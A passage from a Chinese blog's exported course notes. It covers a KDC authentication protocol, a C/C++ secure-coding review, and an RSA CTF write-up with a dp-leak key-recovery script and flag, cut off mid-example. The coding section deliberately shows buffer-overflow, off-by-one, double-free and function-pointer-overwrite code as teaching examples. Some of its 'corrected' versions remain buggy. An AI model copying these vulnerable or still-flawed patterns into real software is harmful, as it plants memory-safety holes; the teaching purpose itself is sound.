并分析该协议如何实现了A与B之间的认证。**\n1.A先告诉KDC，要和B通信，N1防止攻击方通过消息重放假冒KDC\n2.KDC生成一个会话密钥Ks，并用A的密钥加密发给A。同时，KDC还用B的密钥加密Ks，交给A转发。A安全的获得会话密钥Ks\n3.把用B的密钥加密的Ks发送给B.B安全的获得会话密钥Ks\n4.B用会话密钥Ks加密挑战N2，N2的作用是要求A证明自己知道Ks\n5.使B确信A已知道Ks,至此A和B认证成功\n\n","tags":["网络安全技术"],"categories":["Course"]},{"title":"C和C++安全编码复习","url":"/posts/57105.html","content":"## 字符串\n\n### 1.字符串基础\n标准C语言库支持类型为`char`的字符串和类型为`wchar_t`的宽字符串。\n字符串由一个以空字符(null)作为结束的连续字符序列组成，并包含此空字符(`sizeof=strlen+1`)\n一个指向字符串的指针实际指向该字符串的起始字符。\n\n数组大小。数组带来的问题之一是确定其元素数量，例如下面的例子：\n```c\nvoid clear(int array[])\n{\n    for (size_t i = 0; i < sizeof(array) / sizeof(array[0]); ++i){\n    array[i] = 0;\n    }\n}\nvoid dowork(){\nint dis[12];\nclear(dis);\n/* ... */\n}\n```\narray是一个参数，所以它的类型是指针。因此，`sizeof(array`)等于`sizeof(int*)`，`sizeof(array) / sizeof(array[0])`计算结果都是`1`。\n\n\n字符数组初始化：不要指定一个用字符串字面值初始化的字符数组的界限\n```c\nconst char s[3] = \"abc\"; //不安全写法，少一个'\\0'\nconst char s[] = \"abc\"; //推荐初始化方式\n```\n### 2.字符串的长度\n对一个以空字符结尾的字节字符串，`strlen()`统计终止空字节前面的字符数量。然而，宽字符可以包含空字节，所以计算结果会出问题。\n```c\nwchar_t wide_str1[] = L\"0123456789\";\n\nwchar_t *wide_str2 = (wchar_t*)malloc(strlen(wide_str1) + 1);\n\nif(wide_str2 == NULL)\n\n{\n\n/*处理错误*/\n\n}\n\nfree(wide_str2);\n\nwide_str2 = NULL;\n```\n使用`wcslen()`可以计算宽字符串的大小\n```c\nwchar_t wide_str1[] = L\"0123456789\";\n\nwchar_t *wide_str2 = (wchar_t*)malloc(wcslen(wide_str1) + 1);\n\nif(wide_str2 == NULL)\n\n{\n\n/*处理错误*/\n\n}\n\nfree(wide_str2);\n\nwide_str2 = NULL;\n```\n注意此长度没有乘`sizeof(wchar_t)`，所以还是不对,下面是最终正确写法：\n```c\nwchar_t wide_str1[] = L\"0123456789\";\n\nwchar_t *wide_str2 = (wchar_t*)malloc((wcslen(wide_str1)+1)*sizeof(wchar_t));\n\nif(wide_str2 == NULL)\n\n{\n\n/*处理错误*/\n\n}\n\nfree(wide_str2);\n\nwide_str2 = NULL;\n```\n### 3.无界字符串复制\n如果输入超出8个字符，那么会导致未定义的行为。因此不要从一个无界源复制数据到定长数组中，禁止这种方法。\n危险性：谁能保证输入者只会按8个键？\n避免方式：永远不用gets()函数！\n```c\nvoid get_y_or_n(){\n    char response[8];\n    puts(\"Continue? [y] n:\");\n    gets(response);\n    if(response[0] == 'n')\n    exit(0);\n return;\n }\n```\n其实gets()函数在C99中以废弃并在C11中淘汰。它没有提供方法指定`读入的字符数的限制`。这种限制在此函数的如下实现中是显而易见的：\n```c\nchar *gets(char *dest){\n    int c = getchar();\n    char *p = dest;\n    while(c != EOF && c != '\\n')\n    {\n        *p++ = c;\n        c = getchar();\n    }\n    *p = '\\0';\n    return dest;\n}\n```\n错误示例1：拷贝字符串时，源字符串长度可能大于目标数组空间。\n```c\nvoid main(int argc, char *argv[])\n{\n\tchar dst[128];\n\tif （ argc > 1 ）\n\t{\n\t\tstrcpy(dst, argv[1]);  // 源字符串长度可能大于目标数组空间，造成缓冲区溢出\n\t}\n\t/*…*/ \n}\n```\n推荐做法：根据源字符串长度来为目标字符串分配空间。\n```c\nvoid main(int argc, char *argv[])\n{\n\tchar *dst = NULL;\n\tif （ argc > 1 ）\n\t{\n\t\tdst = (char *)malloc(strlen(argv[1]) + 1); /* 【修改】确保字符串空间足够容纳argv[1] */\n\t\tif( dst != NULL )\n\t\t{\n\t\t\tstrncpy(dst, argv[1], strlen(argv[1]));\n\t\t\tdst[strlen(argv[1])] = ’\\0’; //【修改】dst以’\\0’结尾\n\t\t}\n\t}\n\t/*...dst使用后free...*/ \n}\n```\n错误示例2：输入消息长度不可预测，不加检查的复制会造成缓冲区溢出。\n```c\nvoid  Noncompliant()\n{\n\tchar dst[16];\n\tchar * temp = getInputMsg();\n\tif(temp != NULL)\n\t{\n\t\tstrcpy(dst,temp); // temp长度可能超过dst的大小\n\t}\n\treturn; \n}\n```\n推荐做法： \n```c\nvoid  Compliant()\n{\n\tchar dst[16];\n\tchar *temp = getInputMsg();\n\tif(temp != NULL)\n\t{\n\t\tstrncpy(dst, temp, sizeof(dst)); /* 【修改】只复制不超过数组dst大小的数据 */\n\t}\n\tdst[sizeof(dst) -1] = ’\\0’; //【修改】copy以’\\0’结尾\n\treturn;\n}\n```\n### 4.复制和连接字符串\nstrcpy(), strcat(), sprintf(), 容易执行无界操作。例如：\n```c\nint main(int argc, char *argv[]){\n    /*argc参数个数，argv参数数组*/\n}\n```\n当`argc>0`，按照惯例，`argv[0]`指向的字符串是程序名。若`argc > 1`,则`argv[0]~argv[argc-1]`引用的就是实际程序参数。\n当分配的空间不足以复制一个程序的输入，就会产生漏洞。攻击者可以控制argv[0]的内容.\n\n输入一个大于128个字节的字符，栈溢出，即缓冲区溢出漏洞。\n```c\nint main(int argc, char *argv[])\n{\n    /*argc参数个数，argv参数数组*/\n    char prog_name[128];\n    strcpy(prog_name, argv[0]);\n    /* ... */\n}\n```\n标准的写法应该是：\n```c\nint main(int argc, char *argv[])\n{\n    /* 不要假设argv[0]不许为空 */\n    const char *const name = argv[0]? argv[0] : \"\";\n    char *prog_name = (char*)malloc(strlen(name)+1);\n    if(prog_name != NULL)\n     {\n        strcpy(prog_name, name);\n     }\n    else\n     {\n        /* 复原 */\n     }\n}\n```\nC++避免溢出，通过设置`域宽`可以消除gets()的缺陷\n```c\n#include<iostream>\nusing namespace std;\nint mian(){\n    char buf[12];\n    cin.width(12);\n    cin >> buf;\n    cout << buf <<endl;\n}\n```\n例2:\n```c\nint main(int argc, char *argv[])\n  { char name[2048];\n\t\tstrcpy(name,argv[1]);\n\t\tstrcat(name,”=”);\n\t\tstrcat(name,argv[2]);\n\t\t…\n\t  }\n```\n一种改进方式：利用strlen()测试输入字符串的长度，然后动态地分配内存。(用实际串长度来申请临时空间）\n```c\nint main(int argc, char *argv[])  \n  { \n    char  *name=(char *) malloc(strlen(argv[1])+ strlen(argv[2])+ 2);\n\tif(name!=0){\n        strcpy(name,argv[1]);\n\t\tstrcat(name,\"=\");\n\t\tstrcat(name,argv[2]);\n\t\tprintf(\"%s\\n\",name);\n\t\t\t /**其他代码**/\n\t\t\t}\n\telse{  \n            printf(\" No memory errorr!\\n\");\n\t\t}\n\treturn(0);\n}\n```\n### 5.差一错误\n从源字符串拷贝内容到目的字符串，刚好最后的'\\0'没有\n```c\nint main(void)\n{\t\n\t\tchar s[10];\n\t\tstrcpy(s,\"0123456789\");                  //错误1：s数组为10字节，复制了11个字节\n\t\tchar *dest = (char *)malloc(strlen(s)); //错误2：没有考虑结尾字符\n\t\tfor (i = 1; i <= 11; i++)              //错误3：多迭代了一次\n\t\t{\n\t\t\tdest[i] = s[i];                  //错误4：dest[i]可能已经越界\n            dest[i] = '\\0';\n\t\t}\t\n\t\tprintf(\"dest=%s\", dest);\n}\n```\n 修改后的：\n ```c\nint main(void)\n{\t\n\t\tchar s[11];//修改1\n\t\tstrcpy(s,\"0123456789\");\n\t\tchar *dest = (char *)malloc(strlen(s)+1);//修改2\n\t\tfor (i = 1; i <11; i++)//修改3\n\t\t{\n\t\t\tdest[i] = s[i];\n\t\t}\t\n        dest[i] = '\\0';\n\t\tprintf(\"dest=%s\", dest);\n}\n ```\n错误示例：典型的差一错误，未考虑’\\0’结束符写入数组的位置，造成缓冲区溢出和内存改写。\n```c\nvoid NoCompliant()\n{\n\tchar dst[ARRAY_SIZE + 1];\n\tchar src[ARRAY_SIZE + 1];\n\tunsigned int i = 0;\n\tmemset(src, '@', sizeof(dst));\n\tfor(i=0; src[i] != ’\\0’ && (i < sizeof(dst)); ++i )//未考虑’\\0’结束符\n\t\tdst[i] = src[i];\n\tdst[i] = ’\\0’; \n\t/*…*/ \n}\n```\n推荐做法：\n```c\nvoid Compliant()\n{\n\tchar dst[ARRAY_SIZE + 1];\n\tchar src[ARRAY_SIZE + 1];\n\tunsigned int i = 0;\n\tmemset(src, '@', sizeof(dst));\n\tfor(i=0; src[i]!=’\\0’ && (i < sizeof(dst) - 1 ); ++i) /*【修改】考虑’\\0’结束符 */\n\t\tdst[i] = src[i];\n\tdst[i] = ’\\0’; \n\t/*…*/ \n}\n```\n### 6.空字符结尾错误\n`strncpy()`导致结果字符串不是以空字符结尾的\n```c\nint main(void)\n{\n\tchar a[16];\n\tchar b[16];\n\tchar c[16];\n\tstrncpy(a, \"0123456789abcdef\", sizeof(a));//此处已经17个字符'\\0'\n\tstrncpy(b, \"0123456789abcdef\", sizeof(b));//此处已经17个字符+'\\0'\n\tstrcpy(c, a);\n\tsystem(\"pause\");\n\treturn 0;\n}\n```\n修改后的：\n```c\nint main(void)\n{\n\tchar a[17];\n\tchar b[17];\n\tchar c[17];\n\tstrncpy(a, \"0123456789abcdef\", sizeof(a));\n\ta[16] = '\\0';\t\n\tstrncpy(b, \"0123456789abcdef\", sizeof(b));\n\tb[16] = '\\0';\n\tstrcpy(c, a);\n\tsystem(\"pause\");\n\treturn 0;\n}\n```\n错误示例1：strlen()不会将’\\0’结束符算入长度，配合memcpy使用时会丢失’\\0’结束符。\n```c\nvoid  Noncompliant()\n{\n\tchar dst[11];\n\tchar src[] = \"0123456789\";\n\tchar *tmp = NULL;\n\tmemset(dst, '@', sizeof(dst)); \n\tmemcpy(dst, src, strlen(src));\n\tprintf(\"src: %s \\r\\n\", src);\n\ttmp = dst;  //到此，dst还没有以’\\0’结尾\n\tdo\n\t{\n\t\tputchar(*tmp);\n\t}while (*tmp++);    // 访问越界\n\treturn; \n}\n```\n推荐做法： 为目标字符串设置’\\0’结束符\n```c\nvoid  Compliant()\n{\n\tchar dst[11];\n\tchar src[] = \"0123456789\";\n\tchar *tmp = NULL;\n\tmemset(dst, '@', sizeof(dst));\n\tmemcpy(dst, src, strlen(src));\n\tdst[sizeof(dst) - 1] = ’\\0’; \t//【修改】dst以’\\0’结尾\n\tprintf(\"src: %s \\r\\n\", src);\n\ttmp = dst;\n\tdo\n\t{\n\t\tputchar(*tmp);\n\t} while (*tmp++);\n\treturn; \n}\n```\n错误示例2：strncpy()拷贝限长字符串，截断了’\\0’结束符。 \n```c\nvoid  Noncompliant()\n{\n\tchar dst[5];\n\tchar src[] = \"0123456789\";\n\tstrncpy(dst, src, sizeof(dst)); \n     printf(dst); //访问越界，dst没有’\\0’结束符\n\treturn;\n}\n```\n推荐做法： \n```c\nvoid  Compliant()\n{\n\tchar dst[5]; \n\tchar src[] = \"0123456789\";\n\tstrncpy(dst, src, sizeof(dst));\n\tdst[sizeof(dst)-1] = ’\\0’;  // 【修改】最后字节置为’\\0’\n     printf(dst); \n\treturn;\n}\n```\n### 7.使字符串对象的引用失效\n栈溢出的话，可以把目标代码或者数据覆盖到栈里面，关于栈为什么会溢出，其实是因为在编译后，栈的大小就固定了。这种攻击方式也称注入不过解决方法也有很多，要么做边界检查，要么动态的分配内存，还有更简单的那就是直接使用std::basic_string。当然使用string也会出问题,例如迭代器失效。\n```c\nchar input[];\nstring email;\nstring::iterator loc = email.begin();\n//复制到string对象，同时把\";\" 转换成\" \"\n    for (size_t i = 0; i < strlen(input); ++i)\n    {\n        if(input[i] != \";\")\n        email.insert(loc++, input[i]);\n    else\n        email.insert(loc++, ' ');\n}\n```\n第一次insert之后，loc就已经失效，后面的insert都将产生未定义行为。\n正确的写法：\n```c\nchar input[];\nstring email;\nstring::iterator loc = email.begin();\n//复制到string对象，同时把\";\" 转换成\" \"\n    for (size_t i = 0; i < strlen(input); ++i)\n    {\n        if(input[i] != \";\")\n            loc = email.insert(loc, input[i]);\n        else\n            loc = email.insert(loc, ' ');\n            ++loc;\n    }\n```\n### 8.进程内存组织\n![](https://i1.100024.xyz/i/2019/10/31/12bq026.png)\n### 9.代码注入\n恶意代码把栈中的返回代码修改成调用其它函数,甚至是系统中某些命令的代码,导致在该程序退出之前把本身具有的权限交给了这些命令,从而引发最严重的安全问题.\n任何漏洞利用的主要部分都是恶意参数\n```\n恶意参数的特征:\n1.有漏洞的程序必须接受这些参数作为合法输入.\n2.参数,或其他可控制的输入,必须导致有漏洞的代码路径得到执行.\n3.参数不能在程序将控制权转移到ShellCode（恶意代码）之前导致程序异常中止.\n```\n### 10.弧注入\n通过修改栈中的地址,改变程序执行的流程,达到绕过某些代码(特别是安全检查的代码)的技术。\n### 11.字符串漏洞缓解策略\n基本方式是:\n1.预防缓冲区溢出.\n2.侦测缓冲区溢出,并安全恢复.\n3.静态预防:设定缓冲区,不允许超过.\n4.动态预防:在得到实参时,检测参数的长度,如果超出可处理范围,则安全退出.\n5.用新的标准函数替代旧的有安全隐患的函数.例如用`strcpy_s()和strcat_s()`取代` strcpy()和strcat()`或用`strncpy()和strncat()`;用`fgets(buf,bufLen,stdin)和gets_s(buf,bufLen)`     代替`gets(buf)`.\n### 12.禁用不安全函数或对象\n说明：C标准的系列字符串处理函数，不检查目标缓冲区的大小，容易引入缓冲区溢出的安全漏洞。\n```\n\t字符串拷贝函数：strcpy, wcscpy\n\t字符串拼接函数：strcat, wcscat\n\t字符串格式化输出函数：sprintf, swprintf, vsprintf, vswprintf, \n\t字符串格式化输入函数：scanf, wscanf, sscanf, swscanf, fscanf, vfscanf, vscanf, vsscanf\n\tstdin流输入函数：gets\n```\n这类函数是公认的危险函数，应禁止使用此类函数（微软从Windows Vista的开发开始就全面禁用了危险API）。\n**最优选择：**使用ISO/IEC TR 24731-1定义的字符串操作函数的安全版本，如`strcpy_s、strcat_s()、sprintf_s()、scanf_s()、gets_s()`\n这个版本的函数增加了以下安全检查：\n```\n\t检查源指针和目标指针是否为NULL；\n\t检查目标缓冲区的最大长度是否小于源字符串的长度；\n\t检查复制的源和目的对象是否重叠。\n```\n缺点是:编译器对TR 24731的支持还不普遍。\n**次优选择：**可以使用带n的替代函数，如`strncpy/strncat/snprintf`\n需要注意的是，带n版本的函数会截断超出长度限制的字符串，包括源字符串结尾的’\\0’。这就很可能导致目标字符串以非’\\0’结束。字符串缺少’\\0’结束符，同样导致缓冲区溢出和其它未定义行为。需要程序员保证目标字符串以’\\0’结束，所以带n版本的函数也还是存在一定风险。\n\n延伸阅读材料：微软禁用了更多的危险API，参考以下链接：\nhttp://msdn.microsoft.com/en-us/library/bb288454.aspx\n\n## 指针\n### 1.函数指针\n```c\n#include <malloc.h>\n#include <stdio.h>\n#include <string.h>\n#include <conio.h>\n\nvoid good_function(const char *str)\n{\n    printf(\"  This is good_function str=%s\",str); return;\n}\nvoid main(int argc ,char *argv[])\n{\n    #define BufLen 80\n\tstatic char Buf[BufLen];\n\tstatic void (*FunPtr) (const char *str);\n\tFunPtr=&good_function;\n\tstrncpy(Buf,argv[1],strlen(argv[1]));\n\tprintf(\"\\n argc=%d \",argc);\n    printf(\"\\n argv[1]=%s\",argv[1]);\n    printf(\"\\n argv[2]=%s\",argv[2]);\n    printf(\"\\n argv[3]=%s\",argv[3]);\n    getch();\n\t(void)(*FunPtr) (argv[2]);\n}\n```\n如果有人恶意输入`argv[1]`超过`BufLen`长度,则会修改`good_function()`的地址.退出时的`shellcode`会取代该函数.\n### 2.对象指针\n```c\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <conio.h>\nvoid foo(void *arg,int len)\n{\n  #define BufLen 40\n  int i;\n  char Buf[BufLen];\n  long *ptr;\n  char S[BufLen];\n  ptr=(long *)S;\n  for(i=0;i<BufLen;i++)\n      Buf[i]=i;\n  printf(\"\\nAddress ptr=%x Buf=%x S=%x\\n S[]=\",Buf,ptr,S);\n  for(i=0;i<BufLen*2+4;i++)\n      printf(\"%x,\",S[i]);\n  getch();\n  // memcpy(Buf,arg,len);   \n  /*任意写覆盖内存.!!!现在的OS已经在很大程度上封杀了这种漏洞.注意运行时程序出错*/\n  /* 其他程序*/\n}\n\nint main()\n{\n  char S[BufLen*2];\n  int i;\n  for(i=0;i<BufLen*2;i++)\n  S[i]=i;\n  foo(S,(BufLen*2));\n  exit(0);\n}\n\n```\n### 3.禁止定义基类析构函数为非虚函数，所有可能被继承类的析构函数都必须定义为virtual\n说明：基类的析构函数如果不是virtual的，那么在对一个Base类型的指针进行delete时，就不会调用到派生类Derived的析构函数。而派生类里的析构函数一般会用于析构其内部的子对象，这样就可能会造成内存泄漏。\n\n错误示例：代码中的析构函数没有被定义成虚函数。\n```c\nclass Base \n{\npublic:\n\t~Base(){}; //【错误】禁止定义基类析构函数为非虚函数\n};\nclass Derived : public Base \n{\nprivate:\n\tchar *pc;\npublic:\n\tDerived()\n\t{\n\t\tpc=new char[100]; \n\t};\n\t~ Derived()\n\t{\n\t\tdelete [] pc;\n\t};\n};\nvoid main()\n{\n\tBase *obj = new Derived();\n\tdelete obj;\n}\n```\n以上示例代码基类Base的析构函数不是virtual的。因为不是virtual，所以在对Base类型的指针obj进行delete时，不会调用到派生类Derived的析构函数,这样就造成内存泄漏。 \n推荐做法：基类Base的析构函数定义为virtual，这样确保在对Base类型的指针obj进行delete时调用派生类Derived的析构函数。\n```c\nclass Base {\npublic:\n\tvirtual ~Base(){};//【修改】定义基类析构函数为虚函数\n};\nclass Derived : public Base {\nprivate:\n\tchar *pc;\npublic:\n\tDerived()\n\t{\n\t\tpc=new char[100]; \n\t};\n\t~ Derived()\n\t{\n\t\tdelete [] pc;\n\t};\n};\nvoid main()\n{\n\tBase *obj = new Derived();\n\tdelete obj;\n}\n```\n### 4.避免字符串/内存操作函数的源指针和目标指针指向内存重叠区\n说明：内存重叠区是指一段确定大小及地址的内存区，该内存区被多个地址指针指向或引用，这些指针介于首地址和尾地址之间。\n在使用像memcpy、strcpy、strncpy、sscanf()、sprintf()、snprintf()和wcstombs()这样的函数时，复制重叠对象会存在未定义的行为，这种行为可能破坏数据的完整性。\n错误示例1：snprintf的参数使用存在问题\n```c\nvoid  Noncompliant()\n{\n#define MAX_LEN 1024\n\tchar cBuf[MAX_LEN + 1] = {0};\n\tint nPid = 0;\n\tstrncpy(cBuf, ”Hello World!”, strlen(”Hello World!”));\n\tsnprintf(cBuf, MAX_LEN, \"%d: %s\", nPid, cBuf); /* cBuf既是源又是目标，函数使用不安全 */\n\treturn; \n}\n```\n推荐做法：使用不同源和目标缓冲区来实现复制功能。\n```c\nvoid  Compliant()\n{\n#define MAX_LEN 1024\n\tchar cBuf[MAX_LEN + 1] = {0};\n\tchar cDesc[MAX_LEN + 1] = {0}; //【修改】另起一个缓冲区，防止缓冲区重叠出错\n\tint nPid = 0;\n\tstrncpy(cDesc, ”Hello World!”, strlen(”Hello World!”)); /* 【修改】防止缓冲区重叠出错 */\n\tsnprintf(cBuf, MAX_LEN, \"%d: %s\", nPid, cDesc); /* 【修改】防止缓冲区重叠出错 */\n\treturn;\n}\n```\n错误示例2：\n```c\n#define MSG_OFFSET 3\n#define MSG_SIZE 6\nvoid  NoCompliant ()\n{\n\tchar str[] = \"test string\";\n\tchar *ptr1 = str;\n\tchar *ptr2;\n\tptr2 = ptr1+MSG_OFFSET;\n\tmemcpy(ptr2, ptr1, MSG_SIZE);\n\treturn;\n}\n```\n推荐做法：使用memmove函数，源字符串和目标字符串所指内存区域可以重叠，但复制后目标字符串内容会被更改，该函数将返回指向目标字符串的指针。\n```c\n#define MSG_OFFSET 3\n#define MSG_SIZE 6\nvoid  Compliant ()\n{\n\tchar str[] = \"test string\";\n\tchar *ptr1 = str;\n\tchar *ptr2;\n\tptr2 = ptr1 + MSG_OFFSET;\n\tmemmove(ptr2, ptr1, MSG_SIZE); /*【修改】使用memmove代替memcpy，防止缓冲区重叠出错 */\n\treturn;\n}\n```\nmemcpy与memmove的目的都是将N个字节的源内存地址的内容拷贝到目标内存地址中。\n但当源内存和目标内存存在重叠时，memcpy会出现错误，而memmove能正确地实施拷贝，但这也增加了一点点开销。\nmemmove的处理措施：\n```\n\t当源内存的首地址等于目标内存的首地址时，不进行任何拷贝\n\t当源内存的首地址大于目标内存的首地址时，实行正向拷贝\n\t当源内存的首地址小于目标内存的首地址时，实行反向拷贝\n```\n## 内存管理\n### 1.禁止引用未初始化的内存\n说明：有些函数如malloc分配出来的内存是没有初始化的，可以使用memset进行清零，或者使用calloc进行内存分配，calloc分配的内存是清零的。当然，如果后面需要对申请的内存进行全部赋值，就不要清零了，但要确保内存被引用前是被初始化的。此外，分配内存初始化，可以消除之前可能存放在内存中的敏感信息，避免敏感信息的泄露。\n错误示例：如下代码没有对malloc的y内存进行初始化，所以功能不正确。\n```c\n/* return y = Ax */\nint * Noncompliant(int **A, int *x, int n)\n{\n\tif(n <= 0)\n\t\treturn NULL;\n\tint *y = (int*)malloc (n * sizeof (int));\n\tif(y == NULL)\n\t\treturn NULL;\n\tint i, j;\n\tfor (i = 0; i < n; ++i)\n\t{\n\t\tfor (j = 0; j < n; ++j)\n\t\t{\n\t\t\ty[i] += A[i][j] * x[j];\n\t\t}\n\t}\n\treturn y;\n}\n/*...申请的内存使用后free...*/ \n```\n推荐做法：使用memset对分配出来的内存清零。\n```c\nint * Compliant(int **A, int *x, int n)\n{\n\tif(n <= 0)\n\t\treturn NULL;\n\tint *y = (int*)malloc(n * sizeof (int));\n\tif(y == NULL)\n\t\treturn NULL;\n\tint i, j;\n\tmemset (y, 0, n * sizeof(int)); //【修改】确保内存被初始化后才被引用\n\tfor (i = 0; i < n; ++i)\n\t{\n\t\tfor (j = 0; j < n; ++j)\n\t\t{\n\t\t\ty[i] += A[i][j] * x[j];\n\t\t}\n\t}\n\treturn y;\n}\n/*...申请的内存使用后free...*/ \n```\n### 2.禁止访问已经释放的内存\n说明：访问已经释放的内存，是很危险的行为，主要分为两种情况：\n（1）堆内存：一块内存释放了，归还内存池以后，就不应该再访问。因为这块内存可能已经被其他部分代码申请走，内容可能已经被修改；直接修改释放的内存，可能会导致其他使用该内存的功能不正常；读也不能保证数据就是释放之前写入的值。在一定的情况下，可以被利用执行恶意的代码。即使是对空指针的解引用，也可能导致任意代码执行漏洞。如果黑客事先对内存0地址内容进行恶意的构造，解引用后会指向黑客指定的地址，执行任意代码。\n（2）栈内存：在函数执行时，函数内局部变量的存储单元都可以在栈上创建，函数执行完毕结束时这些存储单元自动释放。如果返回这些已释放的存储单元的地址（栈地址），可能导致程序崩溃或恶意代码被利用。\n错误示例1：解引用一个已经释放了内存的指针，会导致未定义的行为。\n```c\ntypedef struct _tagNode\n{\n\tint\tvalue;\n\tstruct _tagNode * next;\n}Node;\nNode *  Noncompliant()\n{\n\tNode * head = (Node *)malloc(Node);\n\tif (head==NULL)\n\t{\n\t\t/* ...do something... */\n\t\treturn NULL;\n\t}\n\t/* ...do something... */\n\tfree(head);\n\t/* ...do something... */\n\thead->next = NULL;  //【错误】解引用了已经释放的内存\n\treturn head;\n}\n```\n错误示例2：函数中返回的局部变量数据有可能会被覆盖掉，导致未定义的行为。\n```c\nchar *  Noncompliant()\n{\n\tchar msg[128];\n\t/* ...do something... */\n\treturn msg;  //【错误】返回了局部变量\n}\n```\n### 3.禁止重复释放内存\n说明：重复释放内存（double-free）会导致内存管理器出现问题。重复释放内存在一定情况下，有可能导致“堆溢出”漏洞，可以被用来执行恶意代码，具有很大的安全隐患。\n错误示例：如下代码两次释放了ptr。\n```c\nvoid  Noncompliant()\n{\n\tchar *ptr = (char*)malloc(size);\n\tif (ptr)\n\t{\n\t\t/* ...do something... */\n\t\tfree(ptr);\n\t}\n\t/* ...do something... */\n\tfree(ptr); //【错误】有可能出现2次释放内存的错误\n}\n```\n推荐做法：申请的内存应该只释放一次。\n```c\nvoid  Compliant()\n{\n\tchar *ptr = (char*)malloc(size);\n\tif (ptr)\n\t{\n\t\t/* ...do something... */\n\t\tfree(ptr);\n\t\tptr = NULL;\n\t} \n\t/* ...do something... */\n\t//【修改】删掉free(ptr)\n}\n```\n### 4.必须对指定申请内存大小的整数值进行合法性校验\n说明：申请内存时没有对指定的内存大小整数作合法性校验，会导致未定义的行为，主要分为两种情况：\n（1）使用 0 字节长度去申请内存的行为是没有定义的，在引用内存申请函数返回的地址时会引发不可预知或不能立即发现的问题。对于可能出现申请0地址的情况，需要增加必要的判断，避免出现这种情况\n（2）使用负数长度去申请内存，负数会被当成一个很大的无符号整数，从而导致因申请内存过大而出现失败，造成拒绝服务。\n错误示例：下列代码进行内存分配时，没有对内存大小整数作合法性校验。\n```c\nint * Noncompliant(int x)\n{\n\tint i;\n\tint * y = (int *)malloc( x * sizeof(int));  //未对x进行合法性校验\n\tfor(i=0; i<x; ++i)\n\t{\n\t\ty[i] = i;\n\t}\n\treturn y;\n}\n/*...申请的内存使用后free...*/ \n```\n推荐做法：调用malloc之前，需要判断malloc的参数是否合法。确保x为整数后才申请内存，否则视为参数无效，不予申请，以避免出现申请过大内存而导致拒绝服务。\n```c\nint * Compliant(int x)\n{\n\tint i;\n\tint *y;\n\tif(x > 0)   //【修改】增加对x进行合法性校验\n\t{\n\t\ty = (int *)malloc( x * sizeof(int));\n\t\tif (y == NULL)\n\t\t\treturn NULL;\n\t}\n\telse\n\t{\n\t\treturn NULL;\n\t}\n\tfor(i=0; i<x; ++i)\n\t{\n\t\ty[i]=i;\n\t}\n\treturn y;\n}\n/*...申请的内存使用后free...*/ \n```\n### 5.禁止释放非动态申请的内存\n说明：非动态申请的内存并不是由内存分配器管理的，如果使用free函数对这块内存进行释放，会对内存分配器产生影响，造成拒绝服务。如果黑客能控制非动态申请的内存内容，并对其进行精心的构造，甚至导致程序执行任意代码。\n错误示例：非法释放非动态申请的内存。\n```c\nvoid  Noncompliant()\n{\n\tchar str[] = \"this is a string\";\n\t/* ...do something... */\n\tfree(str);    //【错误】str不是动态申请的内存，因此不能释放\n}\n```\n推荐做法：非动态分配的内存不需要释放，把原来释放函数free()去掉。\n```c\nvoid  Compliant ()\n{\n\tchar str[] = \"this is a string\";\n\t/* ...do something... */\n\t//【修改】删除free(str)\n}\n```\n### 6.避免使用alloca函数申请内存\n说明：POSIX和C99 均未定义 alloca 的行为，在不支持的平台上运行会有未定义的后果，且该函数在栈帧里申请内存，申请的大小可能越过栈的边界而无法预知。\n错误示例：使用了alloca从堆栈分配内存\n```c\nvoid  Noncompliant(char *buff, int len)\n{\n\tint size = len * 3 + 1, i;\n\tchar *ptr = alloca (size), *p; //【不推荐】避免使用alloca函数申请内存\n\tif (len <= 0)\n\t\treturn;\n\tif (ptr == NULL)\n\t\treturn;\n\tp = ptr;\n\tfor (i = 0; i < len; ++i)\n\t{\n\t\tp += _snprintf(p, 4, \"%02x \", buff[i]);\n\t}\n\t*p = NULL;\n\tprintf (\"%s\", ptr);\n}\n```\n推荐做法：alloca函数返回后，使用指向函数局部堆栈内存区也会出现问题，改用malloc从堆分配内存。\n\n\n\n","tags":["C和C++"],"categories":["Course"]},{"title":"RSA总结","url":"/posts/55360.html","content":"### 已知（dp,e,n,c） dp=d%(p-1)\n\neg：\n```python\ne = 65537\nn = 248254007851526241177721526698901802985832766176221609612258877371620580060433101538328030305219918697643619814200930679612109885533801335348445023751670478437073055544724280684733298051599167660303645183146161497485358633681492129668802402065797789905550489547645118787266601929429724133167768465309665906113\ndp = 905074498052346904643025132879518330691925174573054004621877253318682675055421970943552016695528560364834446303196939207056642927148093290374440210503657\nc = 140423670976252696807533673586209400575664282100684119784203527124521188996403826597436883766041879067494280957410201958935737360380801845453829293997433414188838725751796261702622028587211560353362847191060306578510511380965162133472698713063592621028959167072781482562673683090590521214218071160287665180751\n```\nexp:\n```python\nimport gmpy2\nimport libnum\ne = 65537\nn = 248254007851526241177721526698901802985832766176221609612258877371620580060433101538328030305219918697643619814200930679612109885533801335348445023751670478437073055544724280684733298051599167660303645183146161497485358633681492129668802402065797789905550489547645118787266601929429724133167768465309665906113\ndp = 905074498052346904643025132879518330691925174573054004621877253318682675055421970943552016695528560364834446303196939207056642927148093290374440210503657\nc = 140423670976252696807533673586209400575664282100684119784203527124521188996403826597436883766041879067494280957410201958935737360380801845453829293997433414188838725751796261702622028587211560353362847191060306578510511380965162133472698713063592621028959167072781482562673683090590521214218071160287665180751\n\nfor i in range(1,65538):\n    if (dp*e-1)%i == 0:\n        if n%(((dp*e-1)/i)+1)==0:\n            p=((dp*e-1)/i)+1\n            q=n/(((dp*e-1)/i)+1)\n            phi = (p-1)*(q-1)\n            d = gmpy2.invert(e,phi)%phi\n            print libnum.n2s(pow(c,d,n))\n```\n```\nflag{wow_leaking_dp_breaks_rsa?_98924743502}\n```\n### 已知(dp,dq,q,p,c)\neg:\n```python\ndp= 90494486973243104756298311175705002887155440121025946664275790548694955799661434870163629541771658812502682012435200659355928618529521731475360236486362525996535354732687624609637012830178545914960485330748345108757203508531117591067570383564779625954776907685968592668868046507450242047759226407026094726359\ndq= 92386717102324384872139253931247976320472847834037799716676564640678692924258053130751618730959510913784801723023536527134208843358920592320351399005428347188639433875570867152865970587272904695272790831679276818402117343413503376057524788386479263579869430615501089905630519162146030369086836183772975252551\np= 121869669684596731118740111360803257498670698122183387353481580136405322481841982461820301261370579505460038281590785837096967719889404913176714663774999789266522508163678949469953184327222227297952119212490499582581953510522212981687122483764873187827531047946130999532741388680549345732675732040579796067001\nq= 